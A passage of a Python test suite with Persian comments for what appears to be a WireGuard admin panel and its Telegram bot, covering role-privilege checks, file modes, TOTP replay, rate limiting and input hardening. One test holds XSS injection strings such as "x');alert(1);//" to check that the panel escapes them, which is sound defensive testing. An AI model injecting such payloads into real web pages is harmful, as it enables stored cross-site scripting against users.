        `/api/roles/save` هر مجوزی از ALL_PERMS را می‌پذیرد، پس نقشی
        به نامِ «superuser» با users.manage یک عملیاتِ پشتیبانی‌شده
        است، نه فرض.
        """
        m = self.m
        m.CONFIG["roles"] = {"superuser": {"perms": ["users.manage", "wg.view"]},
                             "reader": {"perms": ["wg.view"]}}
        self.assertTrue(m.role_is_privileged("superuser"),
                        "نقشِ ممتاز با نامِ دیگر تشخیص داده نشد")
        self.assertTrue(m.role_is_privileged("admin"))
        self.assertFalse(m.role_is_privileged("reader"))
        self.assertFalse(m.role_is_privileged("viewer"))

    def test_a_bot_user_cannot_grant_more_than_they_hold(self):
        """قاعده زیرمجموعه‌بودن است: کسی نقشی را می‌دهد که خودش دارد.

        پیش از این فقط نامِ «admin» فیلتر می‌شد، پس نقشِ سفارشیِ
        ممتاز از کنارش رد می‌شد و دارنده‌ی صرفِ bot.manage با آن به
        همان جایی می‌رسید که نامِ «admin» را بسته بودند.
        """
        m = self.m
        m.CONFIG["roles"] = {
            "helper": {"perms": ["bot.manage"]},
            "superuser": {"perms": ["users.manage", "bot.manage"]}}
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "1", "role": "owner"}, {"id": "3", "role": "helper"}]}
        grantable = m.BOT._bu_roles("3")
        self.assertNotIn("superuser", grantable,
                         "نقشِ ممتازتر از خودش قابلِ اعطا ماند")
        self.assertNotIn("admin", grantable)
        self.assertIn("helper", grantable,
                      "اعطای نقشِ خودش افقی است، نه ارتقا — نباید بسته شود")

    def test_the_panel_side_guard_is_capability_based_too(self):
        """bot_admin_grant_violation هم نباید با نام تصمیم بگیرد."""
        m = self.m
        m.CONFIG["roles"] = {"superuser": {"perms": ["users.manage"]}}
        m.CONFIG["bot"] = {"enabled": True, "users": [
            {"id": "1", "role": "owner"}, {"id": "4", "role": "viewer"}]}
        cur = [dict(u) for u in m.CONFIG["bot"]["users"]]
        promoted = [dict(u, role="superuser") if u["id"] == "4" else dict(u)
                    for u in cur]
        self.assertIsNotNone(
            m.bot_admin_grant_violation(promoted, False),
            "ارتقا به نقشِ ممتازِ بی‌نامِ admin از گارد رد شد")
        self.assertIsNone(m.bot_admin_grant_violation(promoted, True),
                          "ادمینِ کامل باید بتواند")

    def test_the_menu_gate_stays_name_based_deliberately(self):
        """گیتِ ورود به منوی مدیریتِ کاربران عمداً نام‌محور است.

        گیت است نه تصمیمِ اعطا، و روی جفتِ ثابتِ نقش‌های **داخلی**
        (owner/admin) کار می‌کند. اگر روزی نقش‌های داخلی هم
        پیکربندی‌پذیر شدند، این تصمیم باید بازبینی شود.
        """
        src = _read_panel_source()
        self.assertIn('bot_user_role(frm) not in ("owner", "admin")', src,
                      "گیتِ منو عوض شده — عمدی؟")


class SecretFileModeTests(unittest.TestCase):
    """فایلِ رازدار باید با مودِ نهایی ساخته شود، نه با chmod ِ بعدی."""

    def test_secret_files_are_created_at_their_final_mode(self):
        """بینِ ساخت و chmod، فایل با umask ِ پیش‌فرض (معمولاً ۰۶۴۴)
        وجود دارد و محتوایش هم همان‌جا نوشته می‌شود.

        ALLOWED با دلیلِ نوشته‌شده برای هر ورودی — هرگز با شل‌کردنِ
        الگو سبز نمی‌شود.
        """
        import ast
        src = _read_panel_source()
        # os.chmod ِ روی مسیرِ tmp که فایل را همان تابع ساخته
        ALLOWED = {
            # tempfile.mkstemp روی POSIX از قبل ۰۶۰۰ می‌سازد؛ این chmod
            # فقط قرارداد را دیدنی می‌کند
            "set_peer_psk",
        }
        bad = []
        for fn in ast.walk(ast.parse(src)):
            if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            if fn.name in ALLOWED:
                continue
            # الگوی هدف «بساز-سپس-chmod» است: تابعی که هم با open ِ
            # ساده می‌نویسد و هم مود را بعدش می‌گذارد. تابعی که اصلاً
            # chmod نمی‌کند دارد حالتِ ساده می‌نویسد (تاریخِ خلاصه،
            # endpoint ِ گارد) و مودِ پیش‌فرض برایش درست است — علامت‌زدنش
            # گاردی می‌سازد که نویز می‌دهد و بعد کسی خاموشش می‌کند.
            has_plain_open = any(
                isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
                and n.func.id == "open"
                and n.args and isinstance(n.args[0], ast.Name)
                and n.args[0].id == "tmp"
                for n in ast.walk(fn))
            has_chmod = any(
                isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                and n.func.attr == "chmod"
                for n in ast.walk(fn))
            if has_plain_open and has_chmod:
                bad.append((fn.lineno, fn.name))
        self.assertEqual(bad, [],
                         "open() ِ ساده روی فایلِ موقتِ رازدار: %s" % bad)

    def test_the_correct_pattern_is_actually_used(self):
        """گاردِ بالا با نبودِ tmp هم سبز می‌ماند — پس وجودِ الگو را
        هم بسنج، وگرنه تستی داریم که هیچ نمی‌سنجد."""
        src = _read_panel_source()
        # دو الگویِ درست: os.open با مودِ صریح، یا tempfile.mkstemp که روی
        # POSIX خودش با ۰۶۰۰ می‌سازد (فایل‌های موقتِ نامِ یکتا).
        n = (src.count("os.O_WRONLY | os.O_CREAT | os.O_TRUNC")
             + src.count("tempfile.mkstemp("))
        self.assertGreaterEqual(n, 5,
                                "فقط %d جا فایل با مودِ نهایی ساخته می‌شود" % n)


class BotDispatchTests(unittest.TestCase):
    """اجرای واقعیِ _dispatch با به‌روزرسانی‌های ساختگیِ تلگرام.

    ربات سطحِ مجوزدهیِ **دومِ مستقل** است: پیر می‌سازد، حذف می‌کند، تونل
    ری‌استارت می‌کند و ورودِ پنل را تأیید می‌کند. گیتِ bot_perms در آن
    دقیقاً هم‌ارزِ _perm_denied در سمتِ HTTP است و هیچ تستی آن را
    اجرا نمی‌کرد.

    نمونه با __new__ ساخته می‌شود، نه __init__: سازنده‌ی واقعی نخِ
    polling را راه می‌اندازد.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-bot-")
        self.m = load_module(self.tmp)
        m = self.m
        self.sent = []       # (chat, text)
        self.answered = []   # شناسه‌ی کالبک‌ها
        self.actions = []    # (frm, chat, data)
        b = m.TelegramBot.__new__(m.TelegramBot)
        b._lang = m.DEFAULT_LANG
        b._edit = None
        b.convo = {}
        b.send = lambda chat, text, keyboard=None: self.sent.append((chat, text))
        b.answer_cb = lambda cb_id, text="": self.answered.append(cb_id)
        b._on_action = lambda frm, chat, data: self.actions.append(
            (frm, chat, data))
        b._on_login_approval = lambda frm, cb: self.actions.append(
            ("login", frm, cb.get("data")))
        b._main_menu = lambda chat, frm: None
        self.b = b

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _authorize(self, uid, perms=("wg.view",)):
        """bot_perms را فقط برای این uid مجاز کن."""
        self.m.bot_perms = lambda u: set(perms) if u == uid else None

    @staticmethod
    def _msg(uid, text, chat=None):
        return {"message": {"from": {"id": uid},
                            "chat": {"id": chat if chat is not None else uid},
                            "text": text}}

    @staticmethod
    def _cb(uid, data, cid="cb1", chat=None, mid=7):
        return {"callback_query": {
            "id": cid, "from": {"id": uid}, "data": data,
            "message": {"chat": {"id": chat if chat is not None else uid},
                        "message_id": mid}}}

    # ── گیتِ مجوز — هر دو مسیر ──────────────────────────────────────────

    def test_unknown_user_gets_no_action_via_callback(self):
        """کاربرِ ناشناس از مسیرِ کالبک هیچ اقدامی نمی‌گیرد — و بی‌صدا."""
        self._authorize(111)
        self.b._dispatch(self._cb(999, "menu:peers"))
        self.assertEqual(self.actions, [], "کاربرِ ناشناس اقدام گرفت")

    def test_unknown_user_gets_no_action_via_message(self):
        """و از مسیرِ پیام هم — ولی اینجا پاسخِ «مجاز نیستی» می‌گیرد.

        دو مسیر عمداً متفاوت‌اند: کالبک ساکت رد می‌کند، پیام شناسه‌ی
        عددیِ کاربر را برمی‌گرداند تا بتواند برای ادمین بفرستد. اگر
        روزی «یکسان‌سازی» شدند، باید تصمیمِ آگاهانه باشد نه تصادف —
        این تست همان سؤال را اجباری می‌کند.
        """
        self._authorize(111)
        self.b._dispatch(self._msg(999, "/start"))
        self.assertEqual(self.actions, [])
        self.assertTrue(self.sent, "پیامِ راهنما فرستاده نشد")
        self.assertIn("999", self.sent[-1][1], "شناسه‌ی کاربر در پاسخ نیست")

    def test_authorized_user_reaches_on_action(self):
        self._authorize(111)
        self.b._dispatch(self._cb(111, "menu:peers"))
        self.assertEqual([a[2] for a in self.actions], ["menu:peers"])

    def test_login_approval_runs_before_the_permission_gate(self):
        """تأییدِ ورودِ پنل باید پیش از گیتِ bot_perms اجرا شود.

        کاربری که برای ۲مرحله‌ای ثبت شده ولی هیچ مجوزِ رباتی ندارد،
        باید بتواند ورودش را تأیید کند. اگر این ترتیب برعکس شود،
        ورودِ دومرحله‌ای برای همان کاربران می‌شکند — و بی‌صدا.
        """
        self.m.bot_perms = lambda u: None        # هیچ‌کس مجوزِ ربات ندارد
        self.b._dispatch(self._cb(999, "lg:token123"))
        self.assertTrue([a for a in self.actions if a[0] == "login"],
                        "تأییدِ ورود پشتِ گیتِ مجوز افتاد")

    # ── نشتِ زبان — دلیلِ وجودِ همان finally ─────────────────────────────

    def test_language_never_leaks_to_the_next_update(self):
        """زبانِ هر به‌روزرسانی نباید به به‌روزرسانیِ بعدی نشت کند.

        _lang حالتِ نمونه است. بدونِ finally، کاربرِ چینی مقدار را
        روی 'zh' می‌گذارد و پاسخِ بعدی — که می‌تواند هشداری به مالک
        باشد — چینی می‌شود.
        """
        m = self.m
        self._authorize(111)
        m.bot_lang = lambda uid: "zh" if uid == 111 else "fa"
        self.b._dispatch(self._cb(111, "menu:peers"))
        self.assertEqual(self.b._lang, m.DEFAULT_LANG,
                         "زبان بعد از dispatch به پیش‌فرض برنگشت")

    def test_language_resets_even_when_the_handler_raises(self):
        """و حتی وقتی هندلر استثنا می‌دهد — نیمه‌ی باارزشِ همان finally.

        finallyای که فقط روی مسیرِ خوش‌بینانه کار کند finally نیست، و
        تنها یک استثنا ثابتش می‌کند.
        """
        m = self.m
        self._authorize(111)
        m.bot_lang = lambda uid: "ru"

        def boom(*a, **k):
            raise RuntimeError("خطای عمدیِ تست")
        self.b._on_action = boom
        with self.assertRaises(RuntimeError):
            self.b._dispatch(self._cb(111, "menu:peers"))
        self.assertEqual(self.b._lang, m.DEFAULT_LANG)

    # ── پاک‌سازیِ حالت و ورودیِ بدقواره ─────────────────────────────────

    def test_edit_target_is_cleared_after_the_action(self):
        """_edit نباید بعد از اقدام باقی بماند، وگرنه پاسخِ بعدی پیامِ
        اشتباهی را ویرایش می‌کند."""
        self._authorize(111)
        self.b._dispatch(self._cb(111, "menu:peers"))
        self.assertIsNone(self.b._edit)

    def test_edit_target_is_cleared_even_when_the_action_raises(self):
        """و روی مسیرِ استثنا هم — همان استدلالِ finally ِ زبان."""
        self._authorize(111)

        def boom(*a, **k):
            raise RuntimeError("خطای عمدیِ تست")
        self.b._on_action = boom
        with self.assertRaises(RuntimeError):
            self.b._dispatch(self._cb(111, "menu:peers"))
        self.assertIsNone(self.b._edit)

    def test_malformed_updates_do_not_raise(self):
        """به‌روزرسانیِ ناقص نباید حلقه‌ی polling را بکشد.

        _dispatch مستقیم روی ورودیِ شبکه نشسته؛ استثنای مهارنشده در
        حلقه‌ی polling یعنی رباتی که بی‌صدا از پاسخ‌دادن می‌ایستد.
        """
        self._authorize(111)
        for upd in ({}, {"message": None}, {"message": {}},
                    {"callback_query": {}},
                    {"message": {"from": {}, "chat": {}, "text": None}}):
            with self.subTest(upd=upd):
                self.b._dispatch(upd)     # نباید استثنا بدهد


class LoginApprovalDocstringTests(unittest.TestCase):
    """داک‌استرینگِ عاملِ دوم نباید ضمانتی قوی‌تر از کد ادعا کند.

    خانواده‌ی باگ: تابعی امنیتی که مقصدش `own or fallback` است ولی متنش
    فقط از `own` می‌گوید. اپراتوری که آن را می‌خواند فکر می‌کند «تأییدِ
    خودِ کاربر» دارد، در حالی که برای کاربرِ بدونِ `tg_chat` عملاً
    «تأییدِ یک ادمین» است.

    گاردِ عام‌ترش — «هر شناسه‌ای که داک‌استرینگ نام می‌برد باید در کد
    باشد» — سنجیده و **رد شد**: روی همین فایل ۲۳ یافته می‌دهد که
    تقریباً همه‌شان کاذب‌اند (`rx_bytes`، `epoch_ms`، `wal_checkpoint`،
    دستورهای Squid — نثرِ توصیفیِ مقدارِ بازگشتی یا نامِ سامانه‌ی
    بیرونی). گاردی که ۲۳ بار بی‌خود قرمز شود نادیده گرفته می‌شود، پس
    این دو تستِ باریک جایش نشستند.
    """

    FUNC = "request_login_approval"

    def _node(self):
        tree = ast.parse(_read_panel_source())
        for n in ast.walk(tree):
            if isinstance(n, ast.FunctionDef) and n.name == self.FUNC:
                return n
        self.fail("تابعِ %s پیدا نشد — نامش عوض شده؟" % self.FUNC)

    def _body_without_docstring(self, node):
        """سورسِ بدنه منهای داک‌استرینگ.

        بدونِ این جداسازی، خودِ داک‌استرینگ می‌تواند ادعای کد را برآورده
        کند و تست به‌طور خاموش بی‌معنا شود — همان تله‌ای که این مخزن دو
        بار خورده است.
        """
        src = _read_panel_source()
        stmts = list(node.body)
        if (stmts and isinstance(stmts[0], ast.Expr)
                and isinstance(stmts[0].value, ast.Constant)
                and isinstance(stmts[0].value.value, str)):
            stmts = stmts[1:]
        return "\n".join(ast.get_source_segment(src, s) or "" for s in stmts)

    def test_the_shared_chat_fallback_still_exists_in_code(self):
        """گاردِ گارد: اگر این بشکند، سیاست عوض شده و متن باید بازنویسی شود."""
        body = self._body_without_docstring(self._node())
        self.assertIn("own or fallback", body,
                      "مقصدِ تأیید دیگر «چتِ کاربر یا چتِ مشترک» نیست — "
                      "داک‌استرینگ و این تست هر دو باید به‌روز شوند "
                      "(plans/043).")
        self.assertIn("alert_cfg()", body,
                      "منبعِ چتِ مشترک عوض شده؛ متنِ داک‌استرینگ را بسنج.")

    def test_docstring_admits_the_shared_chat_fallback(self):
        doc = ast.get_docstring(self._node()) or ""
        self.assertTrue(doc.strip(), "داک‌استرینگ حذف شده است.")
        self.assertIn("چتِ مشترک", doc,
                      "داک‌استرینگ بازگشت به چتِ مشترکِ هشدارها را "
                      "نمی‌گوید — همان ادعای بیش‌ازحدی که plans/043 "
                      "گامِ ۳ رفعش کرد.")
        self.assertIn("ادمین", doc,
                      "داک‌استرینگ نمی‌گوید در آن حالت هر ادمینِ ربات "
                      "می‌تواند تأیید کند — یعنی ضعفِ واقعیِ عاملِ دوم "
                      "پنهان می‌ماند.")

    def test_docstring_does_not_promise_a_knob_that_does_not_exist(self):
        """پلنِ ۰۴۳ متنی پیشنهاد داده بود که به `strict_login_chat` ارجاع
        می‌داد — کلیدی که فقط در گام‌های معوقِ ۱ و ۴ ساخته می‌شد. کپیِ
        عینیِ آن، همان عیبِ «ادعای بیش از کد» را بازمی‌ساخت.
        """
        doc = ast.get_docstring(self._node()) or ""
        src = _read_panel_source()
        for knob in ("strict_login_chat",):
            if knob in doc:
                self.assertIn(knob, src.replace(doc, ""),
                              "داک‌استرینگ از %s می‌گوید ولی چنین کلیدی "
                              "در کد نیست." % knob)


class InlineHandlerArgTests(unittest.TestCase):
    """آرگومانِ داده در onclick ِ درون‌خطی (XSS ِ ذخیره‌شده از برچسبِ سرویس).

    🪤 esc() به‌تنهایی کافی نیست: مرورگر entityهای صفتِ HTML را **پیش از**
    اجرای JS برمی‌گرداند، پس &#39; دوباره ' می‌شود و رشته‌ی JS را می‌بندد.
    jsArg اول JSON.stringify (escape ِ JS) و بعد esc (HTML) می‌کند.
    """

    def _helpers_js(self):
        src = pathlib.Path(PANEL).read_text(encoding="utf-8")
        m = re.search(r"(function el\(id\).*?)// ===== i18n", src, re.S)
        self.assertIsNotNone(m, "بلوکِ el/esc/jsArg در PAGE_HTML پیدا نشد")
        js = m.group(1)
        self.assertIn("function jsArg(v)", js)
        return js

    def test_svc_card_handlers_do_not_embed_raw_data(self):
        """کارتِ سرویس‌ها باید از jsArg استفاده کند، نه esc در کوتیشنِ تکی."""
        src = pathlib.Path(PANEL).read_text(encoding="utf-8")
        ok = re.search(r"deleteSvc\(' \+\s*jsArg\(row\.key\) \+ ',' \+ "
                       r"jsArg\(svcLabel\(row\)\) \+ '\)", src)
        self.assertTrue(ok, "deleteSvc باید آرگومان‌ها را با jsArg بسازد")
        for pat in (r"esc\(svcLabel\(row\)\) \+ '\\'\)",
                    r"onclick=\"deleteSvc\(\\'",
                    r"onclick=\"toggleMtr\(\\'",
                    r"onclick=\"toggleSvcIps\(\\'"):
            self.assertFalse(re.search(pat, src),
                             "الگویِ قدیمیِ esc در کوتیشنِ تکی: %s" % pat)

    @unittest.skipUnless(shutil.which("node"), "node نصب نیست")
    def test_jsarg_survives_html_attribute_decoding(self):
        """شبیه‌سازیِ مرورگر: onclick ساخته می‌شود، entityها باز می‌شوند،
        و کدِ حاصل باید دقیقاً همان رشته‌ی ورودی را به تابع بدهد."""
        js = self._helpers_js() + r"""
const payloads = ["x');alert(1);//", "a\"b", "a&amp;b", "</script><script>",
                  "a\\b", "line\nbreak", " sep", "سیسکو (Cisco)", ""];
function decodeAttr(s){ return s.replace(/&#39;/g,"'").replace(/&quot;/g,'"')
  .replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&"); }
let bad = 0;
for (const p of payloads){
  const html = '<button onclick="f(' + jsArg(p) + ',' + jsArg('k') + ')">';
  const attr = decodeAttr(html.match(/onclick="([^"]*)"/)[1]);
  let got = null, alerted = false;
  const f = (a, b) => { got = [a, b]; };
  const alert = () => { alerted = true; };
  try { new Function('f', 'alert', attr)(f, alert); }
  catch (e) { console.log('THROW', JSON.stringify(p), e.message); bad++; continue; }
  if (alerted || !got || got[0] !== p || got[1] !== 'k'){
    console.log('MISMATCH', JSON.stringify(p), JSON.stringify(got), alerted); bad++; }
}
// و برایِ مقایسه: الگویِ قدیمی باید واقعاً می‌شکست (وگرنه این تست بی‌معناست)
const old = decodeAttr("f('" + esc("x');alert(1);//") + "')");
let oldAlerted = false;
try { new Function('f', 'alert', old)(() => {}, () => { oldAlerted = true; }); } catch (e) {}
console.log(oldAlerted ? 'OLD_PATTERN_VULNERABLE' : 'OLD_PATTERN_SAFE');
console.log('BAD=' + bad);
"""
        with tempfile.TemporaryDirectory() as tmp:
            p = os.path.join(tmp, "t.js")
            with open(p, "w", encoding="utf-8") as f:
                f.write(js)
            r = real_subprocess.run(["node", p], capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("BAD=0", r.stdout, r.stdout)
        self.assertIn("OLD_PATTERN_VULNERABLE", r.stdout)


class RequestHardeningTests(unittest.TestCase):
    """دستهٔ دومِ بازبینی: بدنه‌ی بدشکل، inf/nan، ۵۰۰ ِ JSON، لینکِ اشتراک،
    rate-limit ِ اتمیک، TOTP با رمز، استخرِ WARP، فایل‌های موقتِ یکتا."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-hard-")
        self.m = load_module(self.tmp)
        m = self.m
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)
        salt = "a" * 32
        m.CONFIG["users"] = [
            {"username": "admin", "salt": salt,
             "hash": m.hash_password("secret-pw", salt),
             "pbkdf2_iters": m.PBKDF2_ITERS,
             "role": "admin", "totp": "", "stoken": "s1", "active": True}]
        m.save_config = lambda: None

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _post(self, path, body=None, raw=None, session="admin", headers=None):
        h = make_fake_handler(
            self.m, path=path, method="POST",
            body=(raw if raw is not None else (body or {})),
            headers=headers,
            session=({"u": "admin", "r": "admin"} if session else None))
        h.do_POST()
        code = dict(h.sent).get("__code__")
        txt = b"".join(h.body).decode("utf-8") or "{}"
        return code, json.loads(txt), h

    # ---- بدنه و فیلدهای بدنوع ---------------------------------------------
    def test_a_non_object_json_body_is_a_400_even_before_login(self):
        for raw in (b"[]", b'"x"', b"7", b"null"):
            with self.subTest(raw=raw):
                code, obj, _h = self._post("/api/login", raw=raw, session=None)
                self.assertEqual(code, 400)
                self.assertFalse(obj["ok"])

    def test_wrongly_typed_fields_are_400_not_tracebacks(self):
        cases = [
            ("/api/roles/save", {"name": "rr", "perms": [{}]}),
            ("/api/roles/save", {"name": "rr", "perms": "wg.view"}),
            ("/api/bot/save", {"users": ["x"]}),
            ("/api/bot/save", {"users": {"id": 1}}),
            ("/api/ecmp/save", {"groups": [[1]]}),
            ("/api/alerts/save", {"events": [1], "bot_token": "t",
                                  "chat_id": "1"}),
        ]
        for path, body in cases:
            with self.subTest(path=path, body=body):
                code, obj, _h = self._post(path, body)
                self.assertEqual(code, 400)
                self.assertFalse(obj["ok"])

    def test_proxy_log_count_tolerates_garbage(self):
        m = self.m
        for n in ("abc", None, [], 1e400):
            with self.subTest(n=n):
                self.assertEqual(m.proxy_recent_log(n), [])   # فایلِ لاگ نیست

    def test_parsers_reject_non_finite_numbers(self):
        m = self.m
        for raw in ("inf", "-inf", "nan", "1e400", float("inf"), float("nan")):
            with self.subTest(raw=raw):
                self.assertIsNotNone(m.parse_quota_expires(raw, "")[2])
                self.assertIsNotNone(m.parse_rate_mbit(raw)[1])
                self.assertIsNotNone(m._parse_total_action({"total_gb": raw})[1])
        self.assertEqual(m.parse_quota_expires("2.5", "")[0], 2.5)
        self.assertEqual(m.parse_rate_mbit("20.7"), (20, None))

    def test_json_never_emits_nan_or_infinity(self):
        h = make_fake_handler(self.m, path="/x")
        h._json({"a": float("nan"), "b": [float("inf"), 1.5], "c": {"d": -float("inf")}})
        body = b"".join(h.body).decode()
        self.assertNotIn("NaN", body)
        self.assertNotIn("Infinity", body)
        self.assertEqual(json.loads(body), {"a": None, "b": [None, 1.5],
                                            "c": {"d": None}})

    def test_an_unhandled_exception_becomes_a_json_500(self):
        m = self.m
        m.build_stats = lambda: 1 / 0
        h = make_fake_handler(self.m, path="/api/stats", method="GET",
                              session={"u": "admin", "r": "admin"})
        h.do_GET()                                    # نباید استثنا بالا بیاید
        self.assertEqual(dict(h.sent).get("__code__"), 500)
        obj = json.loads(b"".join(h.body).decode())
        self.assertFalse(obj["ok"])
        self.assertIn("actions.log", obj["error"])
        self.assertTrue(h.close_connection)
        with open(m.ACTION_LOG, encoding="utf-8") as f:
            self.assertIn("unhandled GET /api/stats: ZeroDivisionError", f.read())

    def test_a_route_that_already_answered_is_not_answered_twice(self):
        m = self.m
        orig = m.Handler._do_get

        def boom(self_):
            self_._json({"ok": True})
            raise RuntimeError("after response")
        m.Handler._do_get = boom
        try:
            h = make_fake_handler(self.m, path="/x", method="GET")
            h.do_GET()
        finally:
            m.Handler._do_get = orig
        codes = [c for k, c in h.sent if k == "__code__"]
        self.assertEqual(codes, [200])

    # ---- لینکِ اشتراک -------------------------------------------------------
    def test_share_url_scheme_follows_tls_config(self):
        m = self.m
        m.add_peer("wgtest", "sh", use_psk=False)
        m.CONFIG.pop("tls_cert", None)
        code, obj, _h = self._post("/api/peer/share",
                                   {"iface": "wgtest", "name": "sh", "minutes": 5},
                                   headers={"Host": "panel.test:8787"})
        self.assertTrue(obj["ok"], obj)
        self.assertTrue(obj["url"].startswith("http://panel.test:8787/s/"), obj["url"])
        m.CONFIG["tls_cert"] = "/x/cert.pem"
        code, obj, _h = self._post("/api/peer/share",
                                   {"iface": "wgtest", "name": "sh", "minutes": 5},
                                   headers={"Host": "panel.test"})
        self.assertTrue(obj["url"].startswith("https://panel.test/s/"), obj["url"])

    # ---- rate-limit ِ اتمیک -----------------------------------------------
    def test_login_limiter_reserves_the_slot_at_check_time(self):
        """🪤 پنج درخواستِ هم‌زمان همه از «< 5» رد می‌شدند چون ثبت بعد از
        PBKDF2 بود؛ حالا جا در لحظه‌ی سنجش گرفته می‌شود."""
        m = self.m
        m._login_attempts.clear()
        ip = "203.0.113.50"
        for i in range(5):
            self.assertTrue(m.login_allowed(ip), i)     # همه «در جریان»
        self.assertFalse(m.login_allowed(ip))
        m.login_succeeded(ip)                             # یکی موفق شد → جا برگشت
        self.assertTrue(m.login_allowed(ip))
        self.assertFalse(m.login_allowed(ip))
        # شکست، رزرو را به تلاشِ ناموفق تبدیل می‌کند نه دو تا
        m.login_failed(ip)
        self.assertEqual(len(m._login_attempts[ip]), 5)
        # موفقیتِ بی‌رزرو بی‌اثر است
        m._login_attempts[ip] = []
        m.login_succeeded(ip)
        self.assertEqual(m._login_attempts[ip], [])

    def test_account_limiter_reserves_the_slot_at_check_time(self):
        m = self.m
        m._login_attempts_user.clear()
        for _ in range(m._LOGIN_USER_MAX):
            self.assertTrue(m.login_user_allowed("admin"))
        self.assertFalse(m.login_user_allowed("admin"))
        m.login_user_succeeded("admin")
        self.assertTrue(m.login_user_allowed("admin"))
        m.login_user_failed("admin")
        self.assertEqual(len(m._login_attempts_user["admin"]), m._LOGIN_USER_MAX)

    def test_a_successful_login_does_not_consume_the_budget(self):
        m = self.m
        m._login_attempts.clear(); m._login_attempts_user.clear()
        for i in range(7):
            code, obj, _h = self._post("/api/login", {"username": "admin",
                                                     "password": "secret-pw"},
                                       session=None)
            self.assertEqual((i, code, obj.get("ok")), (i, 200, True))
        self.assertEqual(m._login_attempts.get("127.0.0.1", []), [])
        # و رمزِ غلط می‌شمارد
        for _ in range(5):
            self._post("/api/login", {"username": "admin", "password": "no"},
                       session=None)
        code, obj, _h = self._post("/api/login", {"username": "admin",
                                                 "password": "secret-pw"},
                                   session=None)
        self.assertEqual(code, 429)

    def test_totp_required_step_does_not_consume_the_budget(self):
        m = self.m
        m._login_attempts.clear(); m._login_attempts_user.clear()
        m.CONFIG["users"][0]["totp"] = "JBSWY3DPEHPK3PXP"
        for _ in range(7):
            code, obj, _h = self._post("/api/login", {"username": "admin",
                                                     "password": "secret-pw"},
                                       session=None)
            self.assertTrue(obj.get("totp_required"), obj)
        self.assertEqual(m._login_attempts.get("127.0.0.1", []), [])

    # ---- TOTP ---------------------------------------------------------------
    def test_a_replayed_totp_code_does_not_log_in(self):
        """کدِ TOTP ِ تکراری در مسیرِ ورود باید رد شود.

        شاخه‌ی ردِ ورود فقط totp_verify را دوباره می‌پرسید؛ کدِ تکراری
        verify را پاس می‌کند و consume را نه، پس از هر دو شاخه رد می‌شد
        و ورود موفق بود.
        """
        m = self.m
        m._login_attempts.clear(); m._login_attempts_user.clear()
        m._totp_used.clear()
        secret = "JBSWY3DPEHPK3PXP"
        m.CONFIG["users"][0]["totp"] = secret
        code_now = m.totp_code(secret)
        body = {"username": "admin", "password": "secret-pw",
                "totp": code_now}
        code, obj, _h = self._post("/api/login", body, session=None)
        self.assertEqual((code, obj.get("ok")), (200, True), obj)
        code, obj, _h = self._post("/api/login", body, session=None)
        self.assertFalse(obj.get("ok"), "کدِ تکراری وارد شد")
        self.assertEqual(code, 401)

    def test_replacing_an_existing_totp_needs_the_password(self):
        m = self.m
        m.CONFIG["users"][0]["totp"] = "JBSWY3DPEHPK3PXP"
        code, obj, _h = self._post("/api/totp/setup", {})
        self.assertEqual(code, 403)
        code, obj, _h = self._post("/api/totp/setup", {"password": "wrong"})
        self.assertEqual(code, 403)
        code, obj, _h = self._post("/api/totp/setup", {"password": "secret-pw"})
        self.assertTrue(obj["ok"], obj)
        self.assertIn("secret", obj)
        # بدونِ TOTP ِ قبلی رمز لازم نیست (رفتارِ قبلی)
        m.CONFIG["users"][0]["totp"] = ""
        code, obj, _h = self._post("/api/totp/setup", {})
        self.assertTrue(obj["ok"], obj)

    def test_confirming_totp_rotates_the_session_token(self):
        m = self.m
        code, obj, _h = self._post("/api/totp/setup", {})
        secret = obj["secret"]
        before = m.CONFIG["users"][0]["stoken"]
        code, obj, h = self._post("/api/totp/confirm",
                                  {"code": m.totp_code(secret)})
        self.assertTrue(obj["ok"], obj)
        self.assertEqual(m.CONFIG["users"][0]["totp"], secret)
        self.assertNotEqual(m.CONFIG["users"][0]["stoken"], before)
        self.assertTrue(any(k == "Set-Cookie" and v.startswith("wgs=")
                            for k, v in h.sent))
        self.assertNotIn("admin", m._totp_pending)

    def test_a_pending_totp_secret_expires(self):
        m = self.m
        code, obj, _h = self._post("/api/totp/setup", {})
        secret = obj["secret"]
        m._totp_pending["admin"] = (secret, time.time() - 1)
        code, obj, _h = self._post("/api/totp/confirm",
                                   {"code": m.totp_code(secret)})
        self.assertFalse(obj["ok"])
        self.assertNotIn("admin", m._totp_pending)
        self.assertEqual(m.CONFIG["users"][0]["totp"], "")

    # ---- WARP -----------------------------------------------------------------
    def test_warp_endpoint_pool_and_live_endpoint_are_protected(self):
        """🪤 هدفی که با endpointِ امروز تداخل نداشت پذیرفته می‌شد و بعد از
        چرخشِ گارد، بسته‌های رمزشده‌ی WARP خودشان به تونل می‌رفتند."""
        m = self.m
        orig = m.run

        def fake(cmd, timeout=20):
            if cmd[:2] == ["wg", "show"] and cmd[-1] == "endpoints":
                return 0, "PUBKEY=\t162.159.200.77:2408\n", ""
            return orig(cmd, timeout)
        m.run = fake
        prot = m.warp_protected_ips()
        for ep in list(m.WARP_EP_POOL) + [m.WARP_EP_IP, "162.159.200.77"]:
            with self.subTest(ep=ep):
                self.assertTrue(any(m.ipaddress.ip_address(ep) in n for n in prot))
        for bad in ("188.114.96.0/24", "162.159.192.0/23", "162.159.200.77"):
            with self.subTest(target=bad):
                _k, _v, err = m.warp_validate_target(bad, prot)
                self.assertTrue(err)
        self.assertEqual(m.warp_validate_target("34.120.0.0/16", prot)[2], "")

    def test_warp_targets_write_uses_a_unique_tmp_and_a_reentrant_lock(self):
        m = self.m
        m.WARP_TARGETS = os.path.join(self.tmp, "warp-targets.conf")
        with m._WARP_TARGETS_LOCK:                   # RLock: دوباره گرفتنی
            ok, err = m.warp_targets_write(["gemini.google.com"], "admin")
        self.assertTrue(ok, err)
